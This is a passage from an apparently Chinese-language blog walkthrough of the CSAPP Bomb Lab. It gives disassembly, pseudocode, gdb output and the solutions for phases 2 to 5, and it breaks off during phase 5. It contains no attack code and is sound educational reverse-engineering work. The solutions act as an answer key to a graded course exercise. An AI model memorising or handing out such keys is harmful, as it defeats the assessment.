c"><table><tr><td class="code"><pre><span class="line">设%rsp = <span class="number">0x400000</span>, <span class="number">0x400000</span>的值是<span class="number">1</span></span><br><span class="line">则%rbx = <span class="number">0x400004</span>, %rbp = <span class="number">0x400018</span></span><br><span class="line">%eax = <span class="number">0x400000</span>的值 = <span class="number">0x1</span></span><br><span class="line">%eax = <span class="number">0x2</span></span><br><span class="line"><span class="number">0x400004</span>的数据 == <span class="number">0x2</span></span><br><span class="line">%rbx = <span class="number">0x400008</span></span><br><span class="line"><span class="number">0x400008</span> != <span class="number">0x400018</span> 继续</span><br><span class="line">%eax = <span class="number">0x400004</span>的值 = <span class="number">0x2</span></span><br><span class="line">%eax = <span class="number">0x4</span></span><br><span class="line"><span class="number">0x400008</span>的数据 == <span class="number">0x4</span></span><br><span class="line">%rbx = <span class="number">0x40000c</span></span><br><span class="line">......</span><br><span class="line"> 继续</span><br><span class="line">(第六次)<span class="number">0x400018</span> == <span class="number">0x400018</span> <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>所以一共输入六个数，第一个数为1，后面的数依次为前一个数的两倍。</p><blockquote><p>1 2 4 8 16 32</p></blockquote><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400</span>f43 &lt;phase_3&gt;:</span><br><span class="line">  <span class="number">400</span>f43:<span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>          <span class="keyword">sub</span>    $<span class="number">0x18</span>,%rsp                    <span class="meta"># 栈指针 0x18</span></span><br><span class="line">  <span class="number">400</span>f47:<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c       lea    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">400</span>f4c:<span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>       lea    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  <span class="number">400</span>f51:be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x4025cf</span>,%esi</span><br><span class="line">  <span class="number">400</span>f56:b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400</span>f5b:e8 <span class="number">90</span> fc ff ff       callq  <span class="number">400</span>bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">400</span>f60:<span class="number">83</span> f8 <span class="number">01</span>             cmp    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">400</span>f63:<span class="number">7</span>f <span class="number">05</span>                jg     <span class="number">400</span>f6a &lt;phase_3+<span class="number">0x27</span>&gt;         <span class="meta"># 大于 跳到400f6a</span></span><br><span class="line">  <span class="number">400</span>f65:e8 d0 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">400</span>f6a:<span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span> <span class="number">07</span>       cmpl   $<span class="number">0x7</span>,<span class="number">0x8</span>(%rsp)                <span class="meta"># 比较7和(%rdx)</span></span><br><span class="line">  <span class="number">400</span>f6f:<span class="number">77</span> <span class="number">3</span>c                ja     <span class="number">400</span>fad &lt;phase_3+<span class="number">0x6a</span>&gt;         <span class="meta"># explode_bomb</span></span><br><span class="line">  <span class="number">400</span>f71:<span class="number">8</span>b <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%eax</span><br><span class="line">  <span class="number">400</span>f75:ff <span class="number">24</span> c5 <span class="number">70</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span> jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)            <span class="meta"># 间接跳转</span></span><br><span class="line">  <span class="number">400</span>f7c:b8 cf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0xcf</span>,%eax</span><br><span class="line">  <span class="number">400</span>f81:eb <span class="number">3</span>b                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;         <span class="meta"># 跳到400fbe</span></span><br><span class="line">  <span class="number">400</span>f83:b8 c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x2c3</span>,%eax</span><br><span class="line">  <span class="number">400</span>f88:eb <span class="number">34</span>                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400</span>f8a:b8 <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x100</span>,%eax</span><br><span class="line">  <span class="number">400</span>f8f:eb <span class="number">2</span>d                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400</span>f91:b8 <span class="number">85</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x185</span>,%eax</span><br><span class="line">  <span class="number">400</span>f96:eb <span class="number">26</span>                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400</span>f98:b8 ce <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0xce</span>,%eax</span><br><span class="line">  <span class="number">400</span>f9d:eb <span class="number">1</span>f                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400</span>f9f:b8 aa <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x2aa</span>,%eax</span><br><span class="line">  <span class="number">400</span>fa4:eb <span class="number">18</span>                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400</span>fa6:b8 <span class="number">47</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x147</span>,%eax</span><br><span class="line">  <span class="number">400</span>fab:eb <span class="number">11</span>                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400</span>fad:e8 <span class="number">88</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">400</span>fb2:b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400</span>fb7:eb <span class="number">05</span>                <span class="keyword">jmp</span>    <span class="number">400</span>fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400</span>fb9:b8 <span class="number">37</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x137</span>,%eax</span><br><span class="line">  <span class="number">400</span>fbe:<span class="number">3</span>b <span class="number">44</span> <span class="number">24</span> <span class="number">0</span>c          cmp    <span class="number">0xc</span>(%rsp),%eax</span><br><span class="line">  <span class="number">400</span>fc2:<span class="number">74</span> <span class="number">05</span>                je     <span class="number">400</span>fc9 &lt;phase_3+<span class="number">0x86</span>&gt;</span><br><span class="line">  <span class="number">400</span>fc4:e8 <span class="number">71</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">400</span>fc9:<span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>          <span class="keyword">add</span>    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">400</span>fcd:c3                   retq   </span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400</span>fce &lt;func4&gt;:</span><br><span class="line">  <span class="number">400</span>fce:<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          <span class="keyword">sub</span>    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">400</span>fd2:<span class="number">89</span> d0                <span class="keyword">mov</span>    %edx,%eax</span><br><span class="line">  <span class="number">400</span>fd4:<span class="number">29</span> f0                <span class="keyword">sub</span>    %esi,%eax</span><br><span class="line">  <span class="number">400</span>fd6:<span class="number">89</span> c1                <span class="keyword">mov</span>    %eax,%ecx</span><br><span class="line">  <span class="number">400</span>fd8:c1 e9 <span class="number">1</span>f             shr    $<span class="number">0x1f</span>,%ecx</span><br><span class="line">  <span class="number">400</span>fdb:<span class="number">01</span> c8                <span class="keyword">add</span>    %ecx,%eax</span><br><span class="line">  <span class="number">400</span>fdd:d1 f8                sar    %eax</span><br><span class="line">  <span class="number">400</span>fdf:<span class="number">8</span>d <span class="number">0</span>c <span class="number">30</span>             lea    (%rax,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  <span class="number">400</span>fe2:<span class="number">39</span> f9                cmp    %edi,%ecx</span><br><span class="line">  <span class="number">400</span>fe4:<span class="number">7</span>e <span class="number">0</span>c                jle    <span class="number">400</span>ff2 &lt;func4+<span class="number">0x24</span>&gt;</span><br><span class="line">  <span class="number">400</span>fe6:<span class="number">8</span>d <span class="number">51</span> ff             lea    <span class="number">-0x1</span>(%rcx),%edx</span><br><span class="line">  <span class="number">400</span>fe9:e8 e0 ff ff ff       callq  <span class="number">400</span>fce &lt;func4&gt;</span><br><span class="line">  <span class="number">400</span>fee:<span class="number">01</span> c0                <span class="keyword">add</span>    %eax,%eax</span><br><span class="line">  <span class="number">400</span>ff0:eb <span class="number">15</span>                <span class="keyword">jmp</span>    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;               <span class="meta"># 结束</span></span><br><span class="line">  <span class="number">400</span>ff2:b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400</span>ff7:<span class="number">39</span> f9                cmp    %edi,%ecx</span><br><span class="line">  <span class="number">400</span>ff9:<span class="number">7</span>d <span class="number">0</span>c                jge    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;               <span class="meta"># 结束</span></span><br><span class="line">  <span class="number">400</span>ffb:<span class="number">8</span>d <span class="number">71</span> <span class="number">01</span>             lea    <span class="number">0x1</span>(%rcx),%esi</span><br><span class="line">  <span class="number">400</span>ffe:e8 cb ff ff ff       callq  <span class="number">400</span>fce &lt;func4&gt;</span><br><span class="line">  <span class="number">401003</span>:<span class="number">8</span>d <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>          lea    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401007</span>:<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          <span class="keyword">add</span>    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">40100</span>b:c3                   retq   </span><br></pre></td></tr></table></figure><p>伪代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">phase_3:</span><br><span class="line">%rcx = (%rsp) + <span class="number">0xc</span></span><br><span class="line">%rdx = (%rsp) + <span class="number">0x8</span></span><br><span class="line"><span class="keyword">if</span>(%eax &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((%rdx) &lt;= <span class="number">7</span>) <span class="comment">//无符号数比较</span></span><br><span class="line">    &#123;</span><br><span class="line">        %eax = (%rdx);</span><br><span class="line">        <span class="keyword">goto</span> <span class="number">0x402470</span> + %rax * <span class="number">8</span>所指向的地址;</span><br><span class="line">        %eax = 某个值;</span><br><span class="line">        <span class="keyword">if</span>(%eax == (%rcx)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> explode_bomb;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> explode_bomb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> explode_bomb;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/6a 0x402470</span><br><span class="line">0x402470:       0x400f7c &lt;phase_3+57&gt;   0x400fb9 &lt;phase_3+118&gt;</span><br><span class="line">0x402480:       0x400f83 &lt;phase_3+64&gt;   0x400f8a &lt;phase_3+71&gt;</span><br><span class="line">0x402490:       0x400f91 &lt;phase_3+78&gt;   0x400f98 &lt;phase_3+85&gt;</span><br></pre></td></tr></table></figure><p>使用gdb检查 0x402470处的值为<strong>0x400f7c</strong></p><p>说明第一个参数为0时，程序跳转到0x400f7c，%eax &#x3D; 0xcf &#x3D; <strong>207</strong></p><p>因此，0 207为一组解。</p><blockquote><p>0 207(非唯一解，还有1 311, 2 707, 3 256, 4 389, 5 206, 6 682, 7 327)</p></blockquote><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">000000000040100</span>c &lt;phase_4&gt;:</span><br><span class="line">  <span class="number">40100</span>c:  <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>            <span class="keyword">sub</span>    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">401010</span>:  <span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c         lea    <span class="number">0xc</span>(%rsp),%rcx                    <span class="meta"># 第二个参数</span></span><br><span class="line">  <span class="number">401015</span>:  <span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>         lea    <span class="number">0x8</span>(%rsp),%rdx                    <span class="meta"># 第一个参数</span></span><br><span class="line">  <span class="number">40101</span>a:  be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>         <span class="keyword">mov</span>    $<span class="number">0x4025cf</span>,%esi</span><br><span class="line">  <span class="number">40101</span>f:  b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">mov</span>    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401024</span>:  e8 c7 fb ff ff         callq  <span class="number">400</span>bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">401029</span>:  <span class="number">83</span> f8 <span class="number">02</span>               cmp    $<span class="number">0x2</span>,%eax</span><br><span class="line">  <span class="number">40102</span>c:  <span class="number">75</span> <span class="number">07</span>                  jne    <span class="number">401035</span> &lt;phase_4+<span class="number">0x29</span>&gt;             <span class="meta"># %eax!=2则explode_bomb</span></span><br><span class="line">  <span class="number">40102</span>e:  <span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span> <span class="number">0</span>e         cmpl   $<span class="number">0xe</span>,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">401033</span>:  <span class="number">76</span> <span class="number">05</span>                  jbe    <span class="number">40103</span>a &lt;phase_4+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">401035</span>:  e8 <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>         callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40103</span>a:  ba <span class="number">0</span>e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">mov</span>    $<span class="number">0xe</span>,%edx</span><br><span class="line">  <span class="number">40103</span>f:  be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">mov</span>    $<span class="number">0x0</span>,%esi</span><br><span class="line">  <span class="number">401044</span>:  <span class="number">8</span>b <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span>            <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%edi</span><br><span class="line">  <span class="number">401048</span>:  e8 <span class="number">81</span> ff ff ff         callq  <span class="number">400</span>fce &lt;func4&gt;</span><br><span class="line">  <span class="number">40104</span>d:  <span class="number">85</span> c0                  test   %eax,%eax</span><br><span class="line">  <span class="number">40104</span>f:  <span class="number">75</span> <span class="number">07</span>                  jne    <span class="number">401058</span> &lt;phase_4+<span class="number">0x4c</span>&gt;</span><br><span class="line">  <span class="number">401051</span>:  <span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">0</span>c <span class="number">00</span>         cmpl   $<span class="number">0x0</span>,<span class="number">0xc</span>(%rsp)</span><br><span class="line">  <span class="number">401056</span>:  <span class="number">74</span> <span class="number">05</span>                  je     <span class="number">40105</span>d &lt;phase_4+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401058</span>:  e8 dd <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>         callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40105</span>d:  <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>            <span class="keyword">add</span>    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">401061</span>:  c3                     retq   </span><br></pre></td></tr></table></figure><p>伪代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">phase_4:</span><br><span class="line">%rcx = (%rsp) + <span class="number">0xc</span> #第二个参数</span><br><span class="line">%rdx = (%rsp) + <span class="number">0x8</span> #第一个参数</span><br><span class="line"><span class="keyword">if</span>(%eax == <span class="number">0x2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((%rdx) &lt;= <span class="number">0xe</span>) <span class="comment">//第一个参数要&lt;14</span></span><br><span class="line">    &#123;</span><br><span class="line">        %edx = <span class="number">0xe</span>; <span class="comment">//传参</span></span><br><span class="line">        %esi = <span class="number">0x0</span>;</span><br><span class="line">        %edi = (%rdx);</span><br><span class="line">        <span class="keyword">goto</span> func4; <span class="comment">//三个参数，(%rdx),0,14</span></span><br><span class="line">        <span class="keyword">if</span>(%eax == <span class="number">0</span>) <span class="comment">//func4的返回值为0</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((%rcx)==<span class="number">0x0</span>) <span class="keyword">return</span>; <span class="comment">//第二个参数为0</span></span><br><span class="line">            <span class="keyword">else</span> explode_bomb;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> explode_bomb;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> explode_bomb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> explode_bomb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//x in %rdi,y in %rsi,z in %rdx,t in %rax,k in %ecx</span></span><br><span class="line"><span class="comment">//x未知 y=0 z=14,需要确保func4执行完后t=0</span></span><br><span class="line">func4:</span><br><span class="line"><span class="type">int</span> t = z - y = <span class="number">14</span>;</span><br><span class="line"><span class="type">int</span> k = t &gt;&gt; <span class="number">31</span>;</span><br><span class="line">t = (t + k) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">k = t + y;</span><br><span class="line"><span class="keyword">if</span>(k &lt;= x)</span><br><span class="line">&#123;</span><br><span class="line">    t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(k &gt;= x) <span class="keyword">return</span>;</span><br><span class="line">    y = k + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> func4;</span><br><span class="line">    t = <span class="number">2</span>*t + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    z = k - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> func4;</span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//x=k=7即可，不用进递归。</span></span><br></pre></td></tr></table></figure><p>如上分析，答案为7 0。</p><blockquote><p>7 0</p></blockquote><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401062</span> &lt;phase_5&gt;:</span><br><span class="line">  <span class="number">401062</span>:<span class="number">53</span>                   <span class="keyword">push</span>   %rbx</span><br><span class="line">  <span class="number">401063</span>:<span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>          <span class="keyword">sub</span>    $<span class="number">0x20</span>,%rsp</span><br><span class="line">  <span class="number">401067</span>:<span class="number">48</span> <span class="number">89</span> fb             <span class="keyword">mov</span>    %rdi,%rbx</span><br><span class="line">  <span class="number">40106</span>a:<span class="number">64</span> <span class="number">48</span> <span class="number">8</span>b <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> <span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">401071</span>:<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401073</span>:<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>       <span class="keyword">mov</span>    %rax,<span class="number">0x18</span>(%rsp)</span><br><span class="line">  <span class="number">401078</span>:<span class="number">31</span> c0                xor    %eax,%eax                    <span class="meta"># %eax=0</span></span><br><span class="line">  <span class="number">40107</span>a:e8 <span class="number">9</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40131</span>b &lt;string_length&gt;</span><br><span class="line">  <span class="number">40107</span>f:<span class="number">83</span> f8 <span class="number">06</span>             cmp    $<span class="number">0x6</span>,%eax                    <span class="meta"># 字符串长度为6</span></span><br><span class="line">  <span class="number">401082</span>:<span class="number">74</span> <span class="number">4</span>e                je     <span class="number">4010</span>d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  <span class="number">401084</span>:e8 b1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401089</span>:eb <span class="number">47</span>                <span class="keyword">jmp</span>    <span class="number">4010</span>d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  <span class="number">40108</span>b:<span class="number">0</span>f b6 <span class="number">0</span>c <span class="number">03</span>          movzbl (%rbx,%rax,<span class="number">1</span>),%ecx</span><br><span class="line">  <span class="number">40108</span>f:<span class="number">88</span> <span class="number">0</span>c <span class="number">24</span>             <span class="keyword">mov</span>    %cl,(%rsp)</span><br><span class="line">  <span class="number">401092</span>:<span class="number">48</span> <span class="number">8</span>b <span class="number">14</span> <span class="number">24</span>          <span class="keyword">mov</span>    (%rsp),%rdx</span><br><span class="line">  <span class="number">401096</span>:<span class="number">83</span> e2 <span class="number">0</span>f             <span class="keyword">and</span>    $<span class="number">0xf</span>,%edx</span><br><span class="line">  <span class="number">401099</span>:<span class="number">0</span>f b6 <span class="number">92</span> b0 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span> movzbl <span class="number">0x4024b0</span>(%rdx),%edx</span><br><span class="line">  <span class="number">4010</span>a0:<span class="number">88</span> <span class="number">54</span> <span class="number">04</span> <span class="number">10</span>          <span class="keyword">mov</span>    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)</span><br><span class="line">  <span class="number">4010</span>a4:<span class="number">48</span> <span class="number">83</span> c0 <span class="number">01</span>          <span class="keyword">add</span>    $<span class="number">0x1</span>,%rax</span><br><span class="line">  <span class="number">4010</span>a8:<span class="number">48</span> <span class="number">83</span> f8 <span class="number">06</span>          cmp    $<span class="number">0x6</span>,%rax</span><br><span class="line">  <span class="number">4010</span>ac:<span class="number">75</span> dd                jne    <span class="number">40108</span>b &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  <span class="number">4010</span>ae:c6 <span class="number">44</span> <span class="number">24</span> <span class="number">16</span> <span class="number">00</span>       movb   $<span class="number">0x0</span>,<span class="number">0x16</span>(%rsp)</span><br><span class="line">  <span class="number">4010</span>b3:be <span class="number">5</span>e <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x40245e</span>,%esi</span><br><span class="line">  <span class="number">4010</span>b8:<span class="number">48</span> <span class="number">8</span>d <span class="number">7</span>c <span class="number">24</span> <span class="number">10</span>       lea    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line">  <span class="number">4010</span>bd:e8 <span class="number">76</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  <span class="number">4010</span>c2:<span class="number">85</span> c0                test   %eax,%eax</span><br><span class="line">  <span class="number">4010</span>c4:<span class="number">74</span> <span class="number">13</span>                je     <span class="number">4010</span>d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  <span class="number">4010</span>c6:e8 <span class="number">6</span>f <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">4010</span>cb:<span class="number">0</span>f <span class="number">1</span>f <span class="number">44</span> <span class="number">00</span> <span class="number">00</span>       nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</span><br><span class="line">  <span class="number">4010</span>d0:eb <span class="number">07</span>                <span class="keyword">jmp</span>    <span class="number">4010</span>d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  <span class="number">4010</span>d2:b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">4010</span>d7:eb b2                <span class="keyword">jmp</span>    <span class="number">40108</span>b &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  <span class="number">4010</span>d9:<span class="number">48</span> <span class="number">8</span>b <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>       <span class="keyword">mov</span>    <span class="number">0x18</span>(%rsp),%rax</span><br><span class="line">  <span class="number">4010</span>de:<span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> xor    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">4010e5</span>:<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">4010e7</span>:<span class="number">74</span> <span class="number">05</span>                je     <span class="number">4010</span>ee &lt;phase_5+<span class="number">0x8c</span>&gt;        <span class="meta"># return</span></span><br><span class="line">  <span class="number">4010e9</span>:e8 <span class="number">42</span> fa ff ff       callq  <span class="number">400</span>b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  <span class="number">4010</span>ee:<span class="number">48</span> <span class="number">83</span> c4 <span class="number">20</span>          <span class="keyword">add</span>    $<span class="number">0x20</span>,%rsp</span><br><span class="line">  <span class="number">4010</span>f2:<span class="number">5</span>b                   <span class="keyword">pop</span>    %rbx</span><br><span class="line">  <span class="number">4010</span>f3:c3                   retq   </span><br></pre></td></tr></table></figure><p>伪代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(str)==<span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">    %eax = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        %ecx = (%rbx + %rax); <span class="comment">//取第%rax个字符</span></span><br><span class="line">        (%rsp) = %cl; <span class="comment">//取低八位到%rdx中</span></span><br><span class="line">        %rdx = (%rsp);</span><br><span class="line">        %edx ^= <span class="number">0xf</span>; <span class="comment">//只保留低四位</span></span><br><span class="line">        %edx = (%rdx + <span class="number">0x4024b0</span>); <span class="comment">//偏移为%rdx，基地址为0x4024b0，取32位值</span></span><br><span class="line">        (%rsp + %rax + <span class="number">0x10</span>) = %dl; <span class="comment">//储存所取值的低八位</span></span><br><span class="line">        %rax += <span class="number">1</span>; <span class="comment">//循环次数加一</span></span><br><span class="line">    &#125; <span class="keyword">while</span>(%rax != <span class="number">6</span>); <span class="comment">//必须循环6次</span></span><br><span class="line">    (%rsp+<span class="number">0x16</span>) = <span class="number">0x0</span>; <span class="comment">//储存&#x27;\0&#x27;</span></span><br><span class="line">    %esi = <span class="number">0x40245e</span>;   <span class="comment">//%esi指向储存的flyers字符串</span></span><br><span class="line">    %rdi = (%rsp + <span class="number">0x10</span>); <span class="comment">//%rdi指向%rsp + 0x10保存的</span></span><br><span class="line">    <span class="keyword">if</span>(strings_not_equal) explode_bomb;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        %rax = (%rsp + <span class="number">18</span>);</span><br><span class="line">        %rax ^fs:<span class="number">0x28</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> explode_bomb;</span><br></pre></td></tr></table></figure><p>字符串六个字符保存在%rsp + 0x10 ~ %rsp + 0x15。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/32xb 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;:  0x6d    0x61    0x64    0x75    0x69    0x65    0x72   0x73</span><br><span class="line">0x4024b8 &lt;array.3449+8&gt;:        0x6e    0x66    0x6f    0x74  